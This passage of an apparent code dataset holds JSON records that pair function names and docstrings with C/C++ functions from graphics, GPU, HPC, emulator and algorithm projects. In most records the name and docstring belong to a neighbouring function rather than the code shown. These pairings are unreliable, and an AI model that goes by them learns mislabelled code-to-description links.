{"content":"{'function_name': 'search_boundary3', 'docstring': '\/*\\n    if( offset(msh,cl) == 1029 || offset(msh,cl) == 1082 )\\n    {\\n        std::cout<<yellow<<bold<<\"search_boundary\"<<reset<<std::endl;\\n        std::cout<<\"pt_tmp0 = \"<<pt_tmp0<<std::endl;\\n        std::cout<<\"pt_tmp1 = \"<<pt_tmp1<<std::endl;\\n        std::cout<<\"pt_tmp2 = \"<<pt_tmp2<<std::endl;\\n        std::cout<<\"pt_tmp3 = \"<<pt_tmp3<<std::endl;\\n    }\\n    *\/', 'code': 'void\\nrefine_interface_pro3(cuthho_mesh<T, ET>& msh, typename cuthho_mesh<T, ET>::cell_type& cl,\\n                 const Function& level_set_function, size_t min, size_t max)\\n{\\n    if ( (max-min) < 2 )\\n        return;\\n\\n    typedef typename cuthho_mesh<T, ET>::point_type     point_type;\\n    T iso_val_interface = level_set_function.iso_val_interface ;\\n    size_t mid = (max+min)\/2;\\n    auto p0 = cl.user_data.interface.at(min);\\n    auto p1 = cl.user_data.interface.at(max);\\n    auto pm = (p0+p1)\/2.0;\\n    auto pt = p1 - p0;\\n    auto pn = point_type(-pt.y(), pt.x());\\n    auto ps1 = pm + pn;\\n    auto ps2 = pm - pn;\\n    \\n    \\n    auto lm = level_set_function(pm,msh,cl);\\n    auto ls1 = level_set_function(ps1,msh,cl);\\n    auto ls2 = level_set_function(ps2,msh,cl);\\n    \\n    \/\/ CASE  MAX PT on the boudary\\n    T m_half = ( ps1.y() - pm.y() )\/( ps1.x() - pm.x() );\\n    T q = pm.y() - m_half * pm.x() ;\\n    if( offset(msh,cl) == 119 )\\n    {\\n        std::cout<<yellow<<bold<<\"CELL 119\"<<reset<<std::endl;\\n        std::cout<<\"p0 = \"<<p0 << \" , p1 = \"<<p1<<std::endl;\\n        std::cout<<\"ps1.y() = \"<<ps1.y() << \" , pm.y() = \"<<pm.y()<<std::endl;\\n        std::cout<<\"ps1.x() = \"<<ps1.x() << \" , pm.x() = \"<<pm.x()<<std::endl;\\n        std::cout<<\"ps1.x() = \"<<ps1.x() << \" , pm.x() = \"<<pm.x()<<std::endl;\\n    }\\n    \/*\\n    if( offset(msh,cl) == 118 )\\n    {\\n        T m_half_bis = ( ps2.y() - pm.y() )\/( ps2.x() - pm.x() );\\n        T q_bis = pm.y() - m_half * pm.x() ;\\n        std::cout<<yellow<<bold<<\"CELL 118\"<<reset<<std::endl;\\n        std::cout<<\"p0 = \"<<p0 << \" , p1 = \"<<p1<<std::endl;\\n        std::cout<<\"m_half = \"<<m_half << \" , m_half_bis = \"<<m_half_bis<<std::endl;\\n        std::cout<<\"q = \"<<q << \" , q_bis = \"<<q_bis<<std::endl;\\n        \\n        std::cout<<\"pm = \"<<pm << \" , level_set_function(pm) = \"<<lm<<std::endl;\\n        std::cout<<\"ps1 = \"<<ps1 << \" , level_set_function(ps1) = \"<<ls1<<std::endl;\\n        std::cout<<\"ps2 = \"<<ps2 << \" , level_set_function(ps2) = \"<<ls2<<std::endl;\\n    }\\n    *\/\\n    auto pt_bdry = search_boundary3( msh , cl , pm , m_half , q , lm , level_set_function , iso_val_interface) ;\\n    auto lm_bdry = level_set_function( pt_bdry , msh , cl );\\n    \/*\\n    if( offset(msh,cl) == 118 )\\n        std::cout<<\"pt_bdry = \"<<pt_bdry << \" , level_set_function(lm_bdry) = \"<<lm_bdry<<std::endl;\\n    *\/\\n    \/\/std::cout<<\"pm = \"<<pm << \" , level_set_function(pm) = \"<<lm<<std::endl;\\n    \/\/std::cout<<\"ps1 = \"<<ps1 << \" , level_set_function(ps1) = \"<<ls1<<std::endl;\\n    \/\/std::cout<<\"ps2 = \"<<ps2 << \" , level_set_function(ps2) = \"<<ls2<<std::endl;\\n    \\n   \\n    point_type ip;\\n   \/\/ std::cout<<\"the node of interface are \"<<p0<<\" and \"<<p1<<\". I search pm= \"<<pm<<\" in which phi = \"<<lm<<\" and ps1 e ps2 \"<<ps1<<\" and \"<<ps2<<\"equal to \"<<ls1<<\" , \"<<ls2<<std::endl;\\n    if ( pt_in_cell(msh, ps1, cl) && ( !((lm >= iso_val_interface && ls1 >= iso_val_interface) || (lm < iso_val_interface && ls1 < iso_val_interface)) ) )\\n    {\\n        auto threshold = diameter(msh, cl) \/ 1e20;\\n        \/\/auto threshold = diameter(msh, cl) \/ 1e10;\\n        ip = find_zero_crossing_in_cell3(pm, ps1, level_set_function, threshold,msh,cl);\\n        \/\/std::cout<<\"OLD 1\"<<std::endl;\\n    }\\n    else if ( pt_in_cell(msh, ps2, cl) && ( !((lm >= iso_val_interface && ls2 >= iso_val_interface) || (lm < iso_val_interface && ls2 < iso_val_interface)) ) )\\n    {\\n        auto threshold = diameter(msh, cl) \/ 1e20;\\n        \/\/auto threshold = diameter(msh, cl) \/ 1e10;\\n        ip = find_zero_crossing_in_cell3(pm, ps2, level_set_function, threshold,msh,cl);\\n        \/\/std::cout<<\"OLD 2\"<<std::endl;\\n    }\\n    else if ( pt_in_cell(msh, pt_bdry, cl) && ( !((lm >= iso_val_interface && lm_bdry >= iso_val_interface) || (lm < iso_val_interface && lm_bdry < iso_val_interface)) ) )\\n    {\\n        auto threshold = diameter(msh, cl) \/ 1e20;\\n        \/\/auto threshold = diameter(msh, cl) \/ 1e10;\\n        ip = find_zero_crossing_in_cell3(pm, pt_bdry , level_set_function, threshold,msh,cl);\\n        \/\/std::cout<<\"BDRY NEW\"<<std::endl;\\n    }\\n    else\\n    {\\n        \/\/throw std::logic_error(\"interface not found in search range\");\\n        \/\/std::cout<<yellow<<bold<< \"In cell \"<<offset(msh,cl)<<\" ---> implementing linear approximation. INTERFACE NOT FOUND.\"<<reset<<std::endl;\\n        \/\/ip = pm;\\n        std::cout<<yellow<<bold<< \"In cell \"<<offset(msh,cl)<<\" ---> implementing MINIMISATION ERROR APPROXIMATION. INTERFACE NOT FOUND.\"<<reset<<std::endl;\\n        point_type ret ;\\n        T val_min = 1e10;\\n        if( pt_in_cell(msh , ps1 , cl) && std::abs(ls1-iso_val_interface) < val_min )\\n        {\\n            val_min = std::abs(ls1) ;\\n            ret = ps1 ;\\n            std::cout<<\"ps1 = \"<<ps1 << \" , ls1 = \"<< ls1 <<std::endl;\\n            \\n        }\\n        if( pt_in_cell(msh , ps2 , cl) && std::abs(ls2-iso_val_interface) < val_min )\\n        {\\n            val_min = std::abs(ls2) ;\\n            ret = ps2 ;\\n            std::cout<<\"ps2 = \"<<ps2 << \" , ls2 = \"<< ls2 <<std::endl;\\n        }\\n        if( pt_in_cell(msh , pt_bdry , cl) && std::abs(lm_bdry-iso_val_interface) < val_min )\\n        {\\n            val_min = std::abs(lm_bdry) ;\\n            ret = pt_bdry ;\\n            std::cout<<\"ppt_bdrys1 = \"<<pt_bdry << \" , lm_bdry = \"<<lm_bdry<<std::endl;\\n        }\\n        if( pt_in_cell(msh , pm , cl) && std::abs(lm-iso_val_interface) < val_min )\\n        {\\n            val_min = std::abs(lm) ;\\n            ret = pm ;\\n            std::cout<<\"pm = \"<<ps1 << \" , lm = \"<<ls1<<std::endl;\\n        }\\n        std::cout<<\"ret = \"<<ret << std::endl;\\n        ip = ret;\\n        \\n    }\\n    \/*\\n    if( offset(msh,cl) == 118 )\\n        std::cout<<\"POINT INTERFACE Ip = \"<<ip <<  \" in pos = \"<<mid<<std::endl;\\n    *\/\\n    cl.user_data.interface.at(mid) = ip;\\n\\n    refine_interface_pro3(msh, cl, level_set_function, min, mid);\\n    refine_interface_pro3(msh, cl, level_set_function, mid, max);\\n}'}","id":4444}
{"content":"{'function_name': 'jit_kinect2_init', 'docstring': '\/\/ finalize class', 'code': 't_jit_err jit_kinect2_matrix_calc(t_jit_kinect2 *x, void *inputs, void *outputs)\\n{\\n    t_jit_err\\t\\t\\terr = JIT_ERR_NONE;\\n    t_jit_matrix_info\\tin_minfo;\\n    t_jit_matrix_info\\tout_minfo;\\n    char\\t\\t\\t\\t*out_bp;\\n    long\\t\\t\\t\\ti;\\n    long\\t\\t\\t\\tdimcount;\\n    long\\t\\t\\t\\tplanecount;\\n    long\\t\\t\\t\\tdim[JIT_MATRIX_MAX_DIMCOUNT];\\n    long                out_savelock[NUMOFOUTPUTS];\\n    void *              out_matrix[NUMOFOUTPUTS];\\n    bool                gotMatrices = true;\\n    \\n    \/\/ Get matrices of the outputs\\n    for (i=0;i<NUMOFOUTPUTS;i++)\\n    {\\n        if (!(out_matrix[i] = jit_object_method(outputs,_jit_sym_getindex,i)))\\n        {\\n            gotMatrices = false;\\n        }\\n    }\\n    \\n    \/\/ If valid object and valid output\\n    if (x && gotMatrices) {\\n        \/\/ Lock outputs\\n        for (i = 0; i< NUMOFOUTPUTS; i++)\\n        {\\n            out_savelock[i] = (long) jit_object_method(out_matrix[i],_jit_sym_lock,1);\\n        }\\n        \\n        if (!x->kinect->isOpen)\\n        {\\n            x->kinect->open();\\n            object_post((t_object*)x, \"%s\", x->kinect->getlasterrorstring().c_str());\\n        }\\n        if (x->kinect->isOpen)\\n        {\\n            libfreenect2::FrameMap framemap = x->kinect->getframes();\\n            for (i = 0; i< NUMOFOUTPUTS; i++)\\n            {\\n                jit_object_method((out_matrix[i]), _jit_sym_getinfo, &out_minfo); \/\/ Get output format\\n                jit_object_method((out_matrix[i]), _jit_sym_getdata, &out_bp); \/\/ Get output bitmap char pointer\\n                \\n                if (!out_bp) { \/\/ If no pointer to output bitmap\\n                    err=JIT_ERR_INVALID_OUTPUT;\\n                    goto out;\\n                }\\n                \\n                \/\/get dimensions\/planecount\\n                dimcount   = out_minfo.dimcount;\\n                planecount = out_minfo.planecount;\\n                \\n                FRAMETYPE frametype;\\n                if(i==0)\\n                    frametype = Color;\\n                else if (i==1)\\n                    frametype = IR;\\n                else if (i==2)\\n                    frametype = Depth;\\n                else\\n                    frametype = Registration;\\n                \\n                libfreenect2::Frame *frame = x->kinect->frame(frametype);\\n\\n                if(frame)\\n                {\\n                    jit_kinect2_deduct_info(frame, &in_minfo);\\n                    jit_parallel_ndim_simplecalc2((method)jit_kinect2_copy, &frametype, dimcount, dim, planecount, &in_minfo, reinterpret_cast<char*>(frame->data), &out_minfo, out_bp, 0, 0);\\n                }\\n            }\\n            x->kinect->releaseframes();\\n        } else\\n            return JIT_ERR_INVALID_PTR;\\n\\t}\\n\\telse\\n\\t\\treturn JIT_ERR_INVALID_PTR;\\n\\nout:\\n    for (i = 0; i<NUMOFOUTPUTS; i++)\\n    {\\n        jit_object_method(out_matrix[i],_jit_sym_lock,out_savelock[i]);\\n    }\\n    return err;\\n}'}","id":4447}
{"content":"{'function_name': 'async_execute', 'docstring': '\/\/ into the future', 'code': 'HPX_FORCEINLINE decltype(auto) async(Executor&& exec,\\n        hpx::sycl::experimental::sycl_executor::queue_function_ptr_t<Ts...>&& f,\\n        Ts&&... ts)\\n    {\\n        \/\/ Make sure we only use this for sycl executors\\n        static_assert(std::is_same<std::decay_t<Executor>,\\n            hpx::sycl::experimental::sycl_executor>::value);\\n        \/\/ Use the same async_dispatch than the normal async otherwise\\n        return detail::async_dispatch<\\n            typename std::decay<Executor>::type>::call(HPX_FORWARD(Executor,\\n                                                           exec),\\n            HPX_FORWARD(\\n                hpx::sycl::experimental::sycl_executor::queue_function_ptr_t<\\n                    Ts...>,\\n                f),\\n            HPX_FORWARD(Ts, ts)...);\\n    }'}","id":4448}
{"content":"{'function_name': 'test_enqueue_map_buffer', 'docstring': '\/\/ cl_mem flags', 'code': 'int test_enqueue_map_image(cl_device_id deviceID, cl_context context, cl_command_queue queue, int num_elements)\\n{\\n    int error;\\n    cl_image_format format = { CL_RGBA, CL_UNSIGNED_INT32 };\\n    const size_t imageSize = 256;\\n    int src_flag_id;\\n    cl_uint *initialData;\\n    cl_uint *finalData;\\n    MTdata  d;\\n\\n    PASSIVE_REQUIRE_IMAGE_SUPPORT( deviceID )\\n\\n    initialData = (cl_uint*)malloc(imageSize * imageSize * 4 *sizeof(cl_uint));\\n    finalData = (cl_uint*)malloc(imageSize * imageSize * 4 *sizeof(cl_uint));\\n\\n    if( !is_image_format_supported( context, CL_MEM_READ_ONLY, CL_MEM_OBJECT_IMAGE2D, &format ) )\\n    {\\n        log_error( \"ERROR: Test requires basic OpenCL 1.0 format CL_RGBA:CL_UNSIGNED_INT32, which is unsupported by this device!\\\\n\" );\\n        free(initialData);\\n        free(finalData);\\n        return -1;\\n    }\\n\\n    d = init_genrand( gRandomSeed );\\n  for (src_flag_id=0; src_flag_id < sizeof(flag_set)\/sizeof(flag_set[0]); src_flag_id++) {\\n    clMemWrapper memObject;\\n    log_info(\"Testing with cl_mem_flags src: %s\\\\n\", flag_set_names[src_flag_id]);\\n\\n    generate_random_data( kUInt, (unsigned int)( imageSize * imageSize ), d, initialData );\\n\\n    if ((flag_set[src_flag_id] & CL_MEM_USE_HOST_PTR) || (flag_set[src_flag_id] & CL_MEM_COPY_HOST_PTR))\\n      memObject = create_image_2d( context, CL_MEM_READ_WRITE | flag_set[src_flag_id], &format,\\n                                  imageSize, imageSize, 0, initialData, &error );\\n    else\\n      memObject = create_image_2d( context, CL_MEM_READ_WRITE | flag_set[src_flag_id], &format,\\n                                  imageSize, imageSize, 0, NULL, &error );\\n    test_error( error, \"Unable to create testing buffer\" );\\n\\n    if (!(flag_set[src_flag_id] & CL_MEM_USE_HOST_PTR) && !(flag_set[src_flag_id] & CL_MEM_COPY_HOST_PTR)) {\\n      size_t write_origin[3]={0,0,0}, write_region[3]={imageSize, imageSize, 1};\\n      error = clEnqueueWriteImage(queue, memObject, CL_TRUE, write_origin, write_region, NULL, NULL, initialData, 0, NULL, NULL);\\n      test_error( error, \"Unable to write to testing buffer\" );\\n    }\\n\\n    for( int i = 0; i < 128; i++ )\\n    {\\n\\n      size_t offset[3], region[3];\\n      size_t rowPitch;\\n\\n      offset[ 0 ] = (size_t)random_in_range( 0, (int)imageSize - 1, d );\\n      region[ 0 ] = (size_t)random_in_range( 1, (int)( imageSize - offset[ 0 ] - 1), d );\\n      offset[ 1 ] = (size_t)random_in_range( 0, (int)imageSize - 1, d );\\n      region[ 1 ] = (size_t)random_in_range( 1, (int)( imageSize - offset[ 1 ] - 1), d );\\n      offset[ 2 ] = 0;\\n      region[ 2 ] = 1;\\n      cl_uint *mappedRegion = (cl_uint *)clEnqueueMapImage( queue, memObject, CL_TRUE, CL_MAP_READ | CL_MAP_WRITE,\\n                                                           offset, region, &rowPitch, NULL, 0, NULL, NULL, &error );\\n      if( error != CL_SUCCESS )\\n      {\\n        print_error( error, \"clEnqueueMapImage call failed\" );\\n        log_error( \"\\\\tOffset: %d,%d  Region: %d,%d\\\\n\", (int)offset[0], (int)offset[1], (int)region[0], (int)region[1] );\\n        free(initialData);\\n        free(finalData);\\n        free_mtdata(d);\\n        return -1;\\n      }\\n\\n      \/\/ Write into the region\\n      cl_uint *mappedPtr = mappedRegion;\\n      for( size_t y = 0; y < region[ 1 ]; y++ )\\n      {\\n        for( size_t x = 0; x < region[ 0 ] * 4; x++ )\\n        {\\n          cl_int spin = (cl_int)random_in_range( 16, 1024, d );\\n\\n          cl_int value;\\n          \/\/ Test read AND write in one swipe\\n          value = mappedPtr[ ( y * rowPitch\/sizeof(cl_uint) ) + x ];\\n          value = spin - value;\\n          mappedPtr[ ( y * rowPitch\/sizeof(cl_uint) ) + x ] = value;\\n\\n          \/\/ Also update the initial data array\\n          value = initialData[ ( ( offset[ 1 ] + y ) * imageSize + offset[ 0 ] ) * 4 + x ];\\n          value = spin - value;\\n          initialData[ ( ( offset[ 1 ] + y ) * imageSize + offset[ 0 ] ) * 4 + x ] = value;\\n        }\\n      }\\n\\n      \/\/ Unmap\\n      error = clEnqueueUnmapMemObject( queue, memObject, mappedRegion, 0, NULL, NULL );\\n      test_error( error, \"Unable to unmap buffer\" );\\n    }\\n\\n    \/\/ Final validation: read actual values of buffer and compare against our reference\\n    size_t finalOrigin[3] = { 0, 0, 0 }, finalRegion[3] = { imageSize, imageSize, 1 };\\n    error = clEnqueueReadImage( queue, memObject, CL_TRUE, finalOrigin, finalRegion, 0, 0, finalData, 0, NULL, NULL );\\n    test_error( error, \"Unable to read results\" );\\n\\n    for( size_t q = 0; q < imageSize * imageSize * 4; q++ )\\n    {\\n      if( initialData[ q ] != finalData[ q ] )\\n      {\\n        log_error( \"ERROR: Sample %d (coord %d,%d) did not validate! Got %d, expected %d\\\\n\", (int)q, (int)( ( q \/ 4 ) % imageSize ), (int)( ( q \/ 4 ) \/ imageSize ),\\n                                    (int)finalData[ q ], (int)initialData[ q ] );\\n        free(initialData);\\n        free(finalData);\\n        free_mtdata(d);\\n        return -1;\\n      }\\n    }\\n  } \/\/ cl_mem_flags\\n\\n    free(initialData);\\n    free(finalData);\\n    free_mtdata(d);\\n    return 0;\\n}'}","id":4449}
{"content":"{'function_name': 'getSmallestNode', 'docstring': '\/\/ \uac00\uc7a5 \ucd5c\ub2e8 \uac70\ub9ac\uac00 \uc9e7\uc740 \ub178\ub4dc\uc758 \uc778\ub371\uc2a4', 'code': 'int dijkstra(int start) {\\n    int answer = 0;\\n    \/\/ 1. \uc2dc\uc791 \ub178\ub4dc \ucd08\uae30\ud654\\n    dist[start] = 0;\\n    visited[start] = true;\\n    for (int j = 0; j < graph[start].size(); j++) {\\n        int adjIdx = graph[start][j].first; \/\/ \uc2dc\uc791\ub178\ub4dc\uc5d0\uc11c \uc778\uc811\ud55c \ub178\ub4dc \uc778\ub371\uc2a4 \uc138\ud305\\n        dist[adjIdx] = graph[start][j].second; \/\/ \ud574\ub2f9 \uc778\uc811 \ub178\ub4dc\ub4e4\uae4c\uc9c0 \uac00\ub294 \ube44\uc6a9 \uc138\ud305\\n    }\\n    \/\/ 2. \uc2dc\uc791 \ub178\ub4dc\ub97c \uc81c\uc678\ud55c \uc804\uccb4 n-1\uac1c \ub178\ub4dc\uc5d0 \ub300\ud574 \ubc18\ubcf5\\n    for (int i = 0; i < n-1; i++) {\\n        \/\/ 3. \ud604\uc7ac \ucd5c\ub2e8 \uac70\ub9ac\uac00 \uac00\uc7a5 \uc9e7\uc740 \ub178\ub4dc\ub97c \uaebc\ub0b4 \ubc29\ubb38 \ucc98\ub9ac\\n        int now = getSmallestNode();\\n        visited[now] = true;\\n        \/\/ 4. \ud604\uc7ac \ub178\ub4dc\uc640 \uc5f0\uacb0\ub41c \ub2e4\ub978 \ub178\ub4dc\ub97c \ud655\uc778\\n        for (int j = 0; j < graph[now].size(); j++) {\\n            int cost = dist[now] + graph[now][j].second;\\n            \/\/ 5. \ud604\uc7ac \ub178\ub4dc\ub97c \uac70\uccd0 \ub2e4\ub978 \ub178\ub4dc\ub85c \uc774\ub3d9\ud558\ub294 \uac70\ub9ac\uac00 \ub354 \uc9e7\uc740 \uacbd\uc6b0\\n            if (cost < dist[graph[now][j].first]) {\\n                dist[graph[now][j].first] = cost;\\n            }\\n            \\n        }\\n    }\\n    return answer;\\n}'}","id":4454}
{"content":"{'function_name': 'denoiseb_rd33_select', 'docstring': '\/\/__VIVADO_SYNTH__', 'code': 'inline hw_uint<16> denoiseb_rd34_select(raw_cache& raw, int d0, int d1) {\\n#ifdef __VIVADO_SYNTH__\\n#endif \/\/__VIVADO_SYNTH__\\n  \/\/ denoiseb_rd34 read pattern: { denoiseb_update_0[d0, d1] -> raw[2d0, 2 + d1] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Read schedule : { denoiseb_update_0[d0, d1] -> [2 + d1, 1 + d0, 2] : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  \/\/ Write schedule: { raw_update_0[d0, d1] -> [d1, d0, 1] : -2 <= d0 <= 962 and -3 <= d1 <= 1084 }\\n  \/\/ DD fold: { denoiseb_update_0[d0, d1] -> 1 : -1 <= d0 <= 961 and -1 <= d1 <= 1082 }\\n  auto value_raw_raw_update_0_write0 = raw.raw_raw_update_0_write0_merged_banks_25.peek_1();\\n  return value_raw_raw_update_0_write0;\\n#ifndef __VIVADO_SYNTH__\\n\\tcout << \"Error: Unsupported offsets: \" << \" d0 = \" << d0  << \" d1 = \" << d1  << endl;\\n\\tassert(false);\\n\\treturn 0;\\n#endif \/\/__VIVADO_SYNTH__\\n}'}","id":4459}
{"content":"{'function_name': 'rdp_loadblock', 'docstring': '\/\/Helps to fix Vigilante 8 jpeg backgrounds and logos', 'code': 'static void rdp_loadtile()\\n{\\n  if (rdp.skip_drawing)\\n  {\\n    LRDP(\"loadtile skipped\\\\n\");\\n    return;\\n  }\\n  rdp.timg.set_by = 1;  \/\/ load tile\\n\\n  wxUint32 tile = (wxUint32)((rdp.cmd1 >> 24) & 0x07);\\n\\n  rdp.addr[rdp.tiles[tile].t_mem] = rdp.timg.addr;\\n\\n  wxUint16 ul_s = (wxUint16)((rdp.cmd0 >> 14) & 0x03FF);\\n  wxUint16 ul_t = (wxUint16)((rdp.cmd0 >> 2 ) & 0x03FF);\\n  wxUint16 lr_s = (wxUint16)((rdp.cmd1 >> 14) & 0x03FF);\\n  wxUint16 lr_t = (wxUint16)((rdp.cmd1 >> 2 ) & 0x03FF);\\n\\n  if (lr_s < ul_s || lr_t < ul_t) return;\\n\\n  if (wrong_tile >= 0)  \/\/there was a tile with zero length\\n  {\\n    rdp.tiles[wrong_tile].lr_s = lr_s;\\n\\n    if (rdp.tiles[tile].size > rdp.tiles[wrong_tile].size)\\n      rdp.tiles[wrong_tile].lr_s <<= (rdp.tiles[tile].size - rdp.tiles[wrong_tile].size);\\n    else if (rdp.tiles[tile].size < rdp.tiles[wrong_tile].size)\\n      rdp.tiles[wrong_tile].lr_s >>= (rdp.tiles[wrong_tile].size - rdp.tiles[tile].size);\\n    rdp.tiles[wrong_tile].lr_t = lr_t;\\n    rdp.tiles[wrong_tile].mask_s = rdp.tiles[wrong_tile].mask_t = 0;\\n    \/\/     wrong_tile = -1;\\n  }\\n\\n  if (rdp.tbuff_tex)\/\/ && (rdp.tiles[tile].format == 0))\\n  {\\n    FRDP(\"loadtile: tbuff_tex ul_s: %d, ul_t:%d\\\\n\", ul_s, ul_t);\\n    rdp.tbuff_tex->tile_uls = ul_s;\\n    rdp.tbuff_tex->tile_ult = ul_t;\\n  }\\n\\n  if ((settings.hacks&hack_Tonic) && tile == 7)\\n  {\\n    rdp.tiles[0].ul_s = ul_s;\\n    rdp.tiles[0].ul_t = ul_t;\\n    rdp.tiles[0].lr_s = lr_s;\\n    rdp.tiles[0].lr_t = lr_t;\\n  }\\n\\n  wxUint32 height = lr_t - ul_t + 1;   \/\/ get height\\n  wxUint32 width = lr_s - ul_s + 1;\\n\\n#ifdef TEXTURE_FILTER\\n  LOAD_TILE_INFO &info = rdp.load_info[rdp.tiles[tile].t_mem];\\n  info.tile_ul_s = ul_s;\\n  info.tile_ul_t = ul_t;\\n  info.tile_width = (rdp.tiles[tile].mask_s ? min((wxUint16)width, 1<<rdp.tiles[tile].mask_s) : (wxUint16)width);\\n  info.tile_height = (rdp.tiles[tile].mask_t ? min((wxUint16)height, 1<<rdp.tiles[tile].mask_t) : (wxUint16)height);\\n  if (settings.hacks&hack_MK64) {\\n    if (info.tile_width%2)\\n      info.tile_width--;\\n    if (info.tile_height%2)\\n      info.tile_height--;\\n  }\\n  info.tex_width = rdp.timg.width;\\n  info.tex_size = rdp.timg.size;\\n#endif\\n\\n  int line_n = rdp.timg.width << rdp.tiles[tile].size >> 1;\\n  wxUint32 offs = ul_t * line_n;\\n  offs += ul_s << rdp.tiles[tile].size >> 1;\\n  offs += rdp.timg.addr;\\n  if (offs >= BMASK)\\n    return;\\n\\n  if (rdp.timg.size == 3)\\n  {\\n    LoadTile32b(tile, ul_s, ul_t, width, height);\\n  }\\n  else\\n  {\\n    \/\/ check if points to bad location\\n    if (offs + line_n*height > BMASK)\\n      height = (BMASK - offs) \/ line_n;\\n    if (height == 0)\\n      return;\\n\\n    wxUint32 wid_64 = rdp.tiles[tile].line;\\n    unsigned char *dst = ((unsigned char *)rdp.tmem) + (rdp.tiles[tile].t_mem<<3);\\n    unsigned char *end = ((unsigned char *)rdp.tmem) + 4096 - (wid_64<<3);\\n    loadTile((uint32_t *)gfx.RDRAM, (uint32_t *)dst, wid_64, height, line_n, offs, (uint32_t *)end);\\n  }\\n  FRDP(\"loadtile: tile: %d, ul_s: %d, ul_t: %d, lr_s: %d, lr_t: %d\\\\n\", tile,\\n    ul_s, ul_t, lr_s, lr_t);\\n\\n  if (fb_hwfbe_enabled)\\n    setTBufTex(rdp.tiles[tile].t_mem, rdp.tiles[tile].line*height);\\n}'}","id":4463}
{"content":"{'function_name': 'DeleteQ', 'docstring': '\/*\u51fa\u961f*\/', 'code': 'MGraph CreateGraph(int VertexNum) {\\n\\t\/* \u521d\u59cb\u5316\u4e00\u4e2a\u6709VertexNum\u4e2a\u9876\u70b9\u4f46\u6ca1\u6709\u8fb9\u7684\u56fe *\/\\n\\tVertex V, W;\\n\\tMGraph Graph;\\n \\n\\tGraph = (MGraph)malloc(sizeof(struct GNode));\\t\/* \u5efa\u7acb\u56fe *\/\\n\\tGraph->Nv = VertexNum;\\n\\tGraph->Ne = 0;\\n\\t\/* \u521d\u59cb\u5316\u90bb\u63a5\u77e9\u9635 *\/\\n\\t\/* \u6ce8\u610f\uff1a\u8fd9\u91cc\u9ed8\u8ba4\u9876\u70b9\u7f16\u53f7\u4ece0\u5f00\u59cb\uff0c\u5230(Graph->Nv-1) *\/\\n\\tfor (V = 0; V < Graph->Nv; V++)\\n\\t\\tfor (W = 0; W < Graph->Nv; W++)\\n\\t\\t\\tGraph->G[V][W] = INFINITY;\\n\\treturn Graph;\\n}'}","id":4465}
{"content":"{'function_name': 'getTotalIndexBufferSize', 'docstring': '\/\/ use a 32 bit index', 'code': 'uint32_t fillIndexBuffer(const aiScene& scene, unsigned char* buffer,\\n\\t\\t\\t\\t\\t\\t\\t\\t size_t bufferSize, size_t totalNumVertices,\\n\\t\\t\\t\\t\\t\\t\\t\\t DrawSet* drawSets)\\n\\t\\t{\\n\\t\\t\\tuint32_t totalElements = 0;\\n\\t\\t\\tuint32_t numMeshes = scene.mNumMeshes;\\n\\t\\t\\tunsigned char* p_ib = buffer;\\n\\n\\t\\t\\t\/\/ look at the total number of vertices in the model to find the highest\\n\\t\\t\\t\/\/ possible index value, use the smallest element that will fit it\\n\\t\\t\\tauto sizeofElement = sizeof(uint32_t); \/\/ use a 32 bit index\\n\\t\\t\\tif (totalNumVertices <= std::numeric_limits<uint8_t>::max()) {\\n\\t\\t\\t\\tsizeofElement = sizeof(uint8_t); \/\/ use 8 bit index\\n\\t\\t\\t}\\n\\t\\t\\telse if (totalNumVertices <= std::numeric_limits<uint16_t>::max()) {\\n\\t\\t\\t\\tsizeofElement = sizeof(uint16_t); \/\/ use 16 bit index\\n\\t\\t\\t}\\n\\n\\t\\t\\tfor (uint32_t m = 0; m < numMeshes; ++m) {\\n\\t\\t\\t\\tauto& assimpMesh = *scene.mMeshes[m];\\n\\t\\t\\t\\tauto& drawSet = drawSets[m];\\n\\n\\t\\t\\t\\t\/\/ only looking for triangle meshes\\n\\t\\t\\t\\tif (assimpMesh.mPrimitiveTypes == aiPrimitiveType_TRIANGLE &&\\n\\t\\t\\t\\t\\tassimpMesh.HasFaces())\\n\\t\\t\\t\\t{\\n\\t\\t\\t\\t\\tuint32_t numFaces = assimpMesh.mNumFaces;\\n\\t\\t\\t\\t\\tuint32_t numElements = numFaces * 3;\\n\\t\\t\\t\\t\\ttotalElements += numElements;\\n\\n\\t\\t\\t\\t\\tuint32_t lowest = std::numeric_limits<uint32_t>::max();\\n\\t\\t\\t\\t\\tuint32_t highest = 0;\\n\\n\\t\\t\\t\\t\\t\/\/ copy elements\\n\\t\\t\\t\\t\\tfor (uint32_t f = 0; f < numFaces; ++f) {\\n\\t\\t\\t\\t\\t\\tassert(assimpMesh.mFaces[f].mNumIndices == 3 && \"the face doesn\\'t have 3 indices\");\\n\\t\\t\\t\\t\\t\\tconst auto& face = assimpMesh.mFaces[f];\\n\\n\\t\\t\\t\\t\\t\\tswitch (sizeofElement) {\\n\\t\\t\\t\\t\\t\\t\\tcase sizeof(uint32_t) : {\\n\\t\\t\\t\\t\\t\\t\\t\\tuint32_t indices[3] = {\\n\\t\\t\\t\\t\\t\\t\\t\\t\\tface.mIndices[0],\\n\\t\\t\\t\\t\\t\\t\\t\\t\\tface.mIndices[1],\\n\\t\\t\\t\\t\\t\\t\\t\\t\\tface.mIndices[2]\\n\\t\\t\\t\\t\\t\\t\\t\\t};\\n\\t\\t\\t\\t\\t\\t\\t\\tmemcpy_s(p_ib, bufferSize - (p_ib - buffer),\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t indices, sizeofElement * 3);\\n\\t\\t\\t\\t\\t\\t\\t\\tbreak;\\n\\t\\t\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t\\t\\t\\tcase sizeof(uint16_t) : {\\n\\t\\t\\t\\t\\t\\t\\t\\tuint16_t indices[3] = {\\n\\t\\t\\t\\t\\t\\t\\t\\t\\tstatic_cast<uint16_t>(face.mIndices[0]),\\n\\t\\t\\t\\t\\t\\t\\t\\t\\tstatic_cast<uint16_t>(face.mIndices[1]),\\n\\t\\t\\t\\t\\t\\t\\t\\t\\tstatic_cast<uint16_t>(face.mIndices[2])\\n\\t\\t\\t\\t\\t\\t\\t\\t};\\n\\t\\t\\t\\t\\t\\t\\t\\tmemcpy_s(p_ib, bufferSize - (p_ib - buffer),\\n\\t\\t\\t\\t\\t\\t\\t\\t\\t\\t indices, sizeofElement * 3);\\n\\t\\t\\t\\t\\t\\t\\t\\tbreak;\\n\\t\\t\\t\\t\\t\\t\\t}\\n\\t\\t\\t\\t\\t\\t\\tcase sizeof(uint8_t) : 